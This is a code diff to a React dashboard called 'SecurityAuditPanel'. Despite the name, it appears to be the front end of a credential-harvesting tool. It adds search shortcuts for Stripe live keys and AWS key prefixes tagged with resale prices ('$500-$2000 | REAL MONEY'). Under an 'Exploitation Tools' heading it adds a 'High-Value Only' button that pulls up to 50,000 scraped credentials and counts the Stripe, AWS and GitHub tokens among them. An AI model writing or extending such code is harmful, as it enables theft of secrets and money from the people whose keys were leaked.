@@ -488,11 +488,11 @@ export default function SecurityAuditPanel() {
               </div>
               <div className="grid grid-cols-2 md:grid-cols-4 gap-2">
                 <button
-                  onClick={() => { setSearchInput('sk_live'); setSearchType('keyword'); }}
+                  onClick={() => { setSearchInput('sk_live_'); setSearchType('keyword'); }}
                   className="bg-green-600 hover:bg-green-700 text-white p-3 rounded-lg transition text-left"
                 >
-                  <div className="font-bold text-sm">💰 Stripe Keys</div>
-                  <div className="text-xs opacity-80">$500-$2000 each</div>
+                  <div className="font-bold text-sm">💰 Stripe Live Keys</div>
+                  <div className="text-xs opacity-80">$500-$2000 | REAL MONEY</div>
                 </button>
                 <button
                   onClick={() => { setSearchInput('AKIA'); setSearchType('keyword'); }}
@@ -599,32 +599,53 @@ export default function SecurityAuditPanel() {
           <div className="bg-gray-800 rounded-2xl p-6 border border-yellow-500/30">
             <h2 className="text-2xl font-bold text-yellow-400 mb-4">⚡ Exploitation Tools</h2>
             
-            {/* Load All Database Credentials */}
+            {/* Load Database Credentials */}
             <div className="bg-blue-900/30 border border-blue-500 rounded-lg p-4 mb-6">
               <div className="flex items-center justify-between">
                 <div>
                   <div className="text-white font-bold">📊 Database Credentials</div>
-                  <div className="text-gray-400 text-sm">Load all scanned credentials from database</div>
+                  <div className="text-gray-400 text-sm">Load credentials from database</div>
                 </div>
-                <button
-                  onClick={async () => {
-                    try {
-                      const response = await fetch(`${API_URL}/scraper/all-credentials?limit=5000`, {
-                        headers: { 'x-admin-key': adminKey }
-                      });
-                      const data = await response.json();
-                      if (data.success) {
-                        setResults(data.credentials);
-                        alert(`Loaded ${data.credentials.length} credentials from database!`);
+                <div className="flex gap-2">
+                  <button
+                    onClick={async () => {
+                      try {
+                        const response = await fetch(`${API_URL}/scraper/all-credentials?limit=50000&category=high-value`, {
+                          headers: { 'x-admin-key': adminKey }
+                        });
+                        const data = await response.json();
+                        if (data.success) {
+                          setResults(data.credentials);
+                          alert(`Loaded ${data.credentials.length} HIGH-VALUE credentials!\n\nStripe: ${data.credentials.filter(c => c.credential_type === 'stripe_key').length}\nAWS: ${data.credentials.filter(c => c.credential_type === 'aws_key').length}\nGitHub: ${data.credentials.filter(c => c.credential_type === 'github_token').length}`);
+                        }
+                      } catch (error) {
+                        alert('Failed to load: ' + error.message);
                       }
-                    } catch (error) {
-                      alert('Failed to load: ' + error.message);
-                    }
-                  }}
-                  className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition"
-                >
-                  Load All ({stats?.totalCredentials || 0})
-                </button>
+                    }}
+                    className="px-4 py-2 bg-green-600 hover:bg-green-700 text-white rounded-lg font-semibold transition"
+                  >
+                    🔥 High-Value Only
+                  </button>
+                  <button
+                    onClick={async () => {
+                      try {
+                        const response = await fetch(`${API_URL}/scraper/all-credentials?limit=10000`, {
+                          headers: { 'x-admin-key': adminKey }
+                        });
+                        const data = await response.json();
+                        if (data.success) {
+                          setResults(data.credentials);
+                          alert(`Loaded ${data.credentials.length} credentials from database!`);
+                        }
+                      } catch (error) {
+                        alert('Failed to load: ' + error.message);
+                      }
+                    }}
+                    className="px-4 py-2 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition"
+                  >
+                    Load All ({stats?.totalCredentials || 0})
+                  </button>
+                </div>
               </div>
             </div>
             
